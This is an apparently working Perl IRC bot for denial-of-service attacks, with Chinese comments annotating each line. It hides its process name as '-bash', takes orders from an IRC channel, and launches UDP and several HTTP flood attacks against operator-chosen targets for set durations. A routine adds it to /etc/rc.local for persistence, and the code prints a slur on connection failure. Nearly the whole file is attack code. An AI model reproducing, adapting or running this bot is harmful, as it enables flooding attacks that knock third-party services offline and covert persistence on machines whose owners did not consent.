use strict;
use Socket;
use IO::Socket;


#Commands
#!udp <ip> <port> <time> <packetsize>   // UDP Flooder
#!httpget <host> <page> <time>          // HTTP-GET Flooder
#!httppost <host> <page> <time>         // HTTP-POST Flooder
#!httphead <host> <page> <time>         // HTTP-HEAD Flooder
#!rapidhttpget <host> <page> <time>     // Rapid HTTP-GET Flooder
#!quit //Quits bot
#Made by Vypor | Github.com/Vypor
#Hidden Proccess
$0 = "-bash";                                                                   # 隱藏執行？

#Server IP or hostname, Channel, Serverpassword (nothing if you dont have one)
my $server      = "irc.freetools.co";
my $channel     = "#perls";
my $serverport  = "15";
my $maxnamechar = "6";
my $serverpass  = "";

reconnect:
my $nick;
for ( 0 .. $maxnamechar ) { $nick .= chr( int( rand(25) + 65 ) ); }             # 產生隨機 $Nick，長度 $maxnamechar，字母 A - Z。
my $login;
for ( 0 .. $maxnamechar ) { $login .= chr( int( rand(25) + 65 ) ); }            # 產生隨機 $login，長度 $maxnamechar，字母 A - Z。

my $sock = new IO::Socket::INET(                                                # 建立 Socket 連線。
    PeerAddr => $server,
    PeerPort => $serverport,
    Proto    => 'tcp'
) or goto reconnect and print "fag\n";                                          # 連線建立失敗。

if ( $serverpass = !'' ) {                                                      # 若有連線密碼則傳遞。
    print $sock "PASS $serverpass\r\n";                                         # IRC 的封包格式如此，以 \r\n 結尾。
}

#Auth Ourselfs
print $sock "NICK $nick\r\n";                                                   # 傳遞 Nick 並且處理回覆：
while ( my $input = <$sock> ) {                                                 # Socket 從伺服器接收訊息，放進 $input 中。
    
	#Reconnect And Change Nick Name

    if ( $input =~ /433/ ) {                                                    # IRC 的錯誤返回碼 433，Nickname 重複。    
        goto reconnect;                                                         # 重新生成 $Nick 等，重新連線。
    }
    elsif ( $input =~ /^    (.*)$/i ) {                                         # 正則表達式
        print $sock "PONG $1\r\n";                                              # $1 是上一行正則表達式的括號中的內容。
        print "Connected..!\n";                                                 # 連線建立。
        print $sock "USER $login 8 * :Kawaii Bot\r\n";                          # 用戶登錄名 $login，登錄模式 8，原名 Kawaii Bot。
        if ( $input =~ /^PING(.*)$/i ) {                                        # PING、PONG 命令用于確認連線存活。
            print $sock "PONG $1\r\n";                                          #
            print $sock "JOIN $channel\r\n";                                    # 加入 IRC 頻道。
        }

        last;                                                                   # last 跳出現在所在的迴圈。
    }
}
my $user;
my $host;
my $chnl;
my $message;

while (<$sock>) {                                                               # 持續接收指令並且回應。
    if ( $_ =~ /^PING(.*)$/i ) {                                                # PING、PONG 命令用于確認連線存活。
        print $sock "PONG $1\r\n";
    }
    if ( $_ =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/ ) {                      # :($user)!($host) PRIVMSG ($chnl) :($message)
                                                                                # $host 的 $user 向目標／頻道 $chnl 發送了 $message
	$user    = $1;
	$host    = $2;
	$chnl    = $3;
	$message = $4;



my ( $method, $ip, $port, $time, $packetsize, $other ) = split( / /, $message, 6 ); # 將 $message 以空格切割成以上的變數。
                                                                                # $message 長得像：$method $ip $port $time $packetsize $other

#IRC Command Parsing / Sub calling



        if ( $method =~ /^!quit\s*$/ ) {                                        # 當接收到的訊息是 !quit 時：
             die "Quitting!\n";                                                 # 返回訊息 Quitting! 並且結束程式。
	}
	
        if ( $method =~ /^!udp\s*$/ ) {                                         # 當接收到的訊息是 !udp 時：
              my ( $iaddr, $endtime, $psize, $pport );
        	    $iaddr = inet_aton("$ip") or print "Cant find host..\n";        # 將 String $ip 類型轉換成 ip_address $iaddr
           	    $endtime = time() + ( $time ? $time : 1000000 );                # 結束時間設定成 $endtime 之後，否則爲 1000000 
            	    socket( flood, PF_INET, SOCK_DGRAM, 17 );                   # 建立一個 Socket。
            
		print $sock "PRIVMSG $chnl :[UDP-Flood Started on $ip for $time seconds]\r\n"; # 向 IRC 發出訊息。

            for ( ; time() <= $endtime ; ) {                                    # 在結束時間到之前：
                $psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 ); # 指定封包大小否則隨機。
                $pport = $port ? $port : int( rand(65500) ) + 1;                # 指定連接的 port 否則隨機。
                send( flood, pack( "a$psize", "flood" ), 0, pack_sockaddr_in( $pport, $iaddr )
                );                                                              # 向目標發送封包。
            }
            print $sock "PRIVMSG $chnl :[UDP-Flood Ended]\r\n";                 # 向 IRC 發出訊息。
	}
	
	
        if ( $method =~ /^!hi\s*$/ ) {                                          # 當接收到的訊息是 !hi 時：
	print $sock "PRIVMSG $chnl :$method $ip $port $packetsize $other";          # 向 IRC 發出訊息。
	}
	
	
        if ( $method =~ /^!httpget\s*$/ ) {                                     # 當接收到的訊息是 !httpget 時： 
		print $sock "PRIVMSG $chnl :[Started HTTP-GET Flood]\r\n";              # 向 IRC 發出訊息。
            my $endtime;
            $endtime = time() + ( $time ? $time : 1000000 );                    # 結束時間設定成 $endtime 之後，否則爲 1000000 
            for ( ; time() <= $endtime ; ) {                                    # 在結束時間到之前：
                my $httpget = IO::Socket::INET->new(                            # 建立一個 TCP Socket。
                    Proto    => 'tcp',
                    PeerAddr => $ip,
                    PeerPort => '80',
                ) or return $!;                                                 # 根據上下文內容返回錯誤號或者錯誤串
                print $httpget "GET /" . $port . " HTTP/1.1\r\n";               # 發出 HTTP 封包，HTTP 封包內容。
                print $httpget "Host: ", $ip, "\r\n";
                print $httpget "Connection: close", "\r\n";
                print $httpget "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
                print $httpget "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
            }
            print $sock "PRIVMSG $chnl :[Finished HTTP-GET Flood]\r\n";         # 向 IRC 發出訊息。
        }
		
		if ( $method =~ /^!httppost\s*$/ ) {                                    # 當接收到的訊息是 !httppost 時： 
		print $sock "PRIVMSG $chnl :[Started HTTP-POST Flood]\r\n";             # 向 IRC 發出訊息。
            my $endtime;
            $endtime = time() + ( $time ? $time : 1000000 );                    # 結束時間設定成 $endtime 之後，否則爲 1000000 
            for ( ; time() <= $endtime ; ) {                                    # 在結束時間到之前：
                my $httppost = IO::Socket::INET->new(                           # 建立一個 TCP Socket。
                    Proto    => 'tcp',
                    PeerAddr => $ip,
                    PeerPort => '80',
                ) or return $!;                                                 # 根據上下文內容返回錯誤號或者錯誤串
                print $httppost "POST /" . $port . " HTTP/1.1\r\n";             # 發出 HTTP 封包，HTTP 封包內容。
                print $httppost "Host: ", $ip, "\r\n";
                print $httppost "Connection: close", "\r\n";
                print $httppost "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
                print $httppost "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
            }
            print $sock "PRIVMSG $chnl :[Finished HTTP-POST Flood]\r\n";        # 向 IRC 發出訊息。
        }
		
		if ( $method =~ /^!httphead\s*$/ ) {                                    # 當接收到的訊息是 !httphead 時：
		print $sock "PRIVMSG $chnl :[Started HTTP-HEAD Flood]\r\n";             # 向 IRC 發出訊息。
            my $endtime;
            $endtime = time() + ( $time ? $time : 1000000 );                    # 結束時間設定成 $endtime 之後，否則爲 1000000 
            for ( ; time() <= $endtime ; ) {                                    # 在結束時間到之前：
                my $httphead = IO::Socket::INET->new(                           # 建立一個 TCP Socket。
                    Proto    => 'tcp',
                    PeerAddr => $ip,
                    PeerPort => '80',
                ) or return $!;                                                 # 根據上下文內容返回錯誤號或者錯誤串
                print $httphead "HEAD /" . $port . " HTTP/1.0\r\n";             # 發出 HTTP 封包，HTTP 封包內容。
                print $httphead "Host: ", $ip, "\r\n";
                print $httphead "Connection: close", "\r\n";
                print $httphead "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
                print $httphead "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
            }
            print $sock "PRIVMSG $chnl :[Finished HTTP-HEAD Flood]\r\n";        # 向 IRC 發出訊息。
        }
		
		if ( $method =~ /^!rapidhttpget\s*$/ ) {                                # 當接收到的訊息是 !rapidhttpget 時：
		print $sock "PRIVMSG $chnl :[Started RAPID-HTTP-GET Flood]\r\n";        # 向 IRC 發出訊息。
            my $endtime;
            $endtime = time() + ( $time ? $time : 1000000 );                    # 結束時間設定成 $endtime 之後，否則爲 1000000
            for ( ; time() <= $endtime ; ) {                                    # 在結束時間到之前：
                my $rapidhttpget = IO::Socket::INET->new(                       # 建立一個 TCP Socket。
                    Proto    => 'tcp',
                    PeerAddr => $ip,
                    PeerPort => '80',
                ) or return $!;                                                 # 根據上下文內容返回錯誤號或者錯誤串
                print $rapidhttpget "GET /" . $port . " HTTP/1.0\r\n";          # 發出 HTTP 封包，HTTP 封包內容。
                print $rapidhttpget "Host: ", $ip, "\r\n";
				print $rapidhttpget "Keep-Alive: 300", "\r\n";
                print $rapidhttpget "Connection: keep-alive", "\r\n";
                print $rapidhttpget "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
                print $rapidhttpget "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
            }
            print $sock "PRIVMSG $chnl :[Finished RAPID-HTTP-GET Flood]\r\n";   # 向 IRC 發出訊息。
        }

    }
}
sleep 15;                                                                       # 等待
goto reconnect;                                                                 # 重新開始連線。



#System Checks
sub addtostartup {                                                              # 設定開機啓動。
    my @checkstr;
    my $location = sprintf( $ENV{'PWD'} );                                      # %ENV 是環境變數，$ENV{'PWD'} 是 Current path。
    my $name     = "perl $location/$0";                                         # $0: 包含正在執行的腳本的文件名。
    open( IN, '/etc/rc.local' ) or print "Couldnt add to startup\n";            # 打開文件 /etc/rc.local 設定開機時執行的指令。
    while ( my $line = <IN> ) { push( @checkstr, $line ); }                     # 讀取 rc.local 文件。
    my $checkme = join "", @checkstr;

    if ( $checkme =~ /$name/ ) { }                                              # 當 rc.local 中不包含自己。
    else {
        print "Adding to Startup...\n";
        system("sed -i -e '1i$name\' /etc/rc.local");                           # 添加開機啓動指令。
    }
}
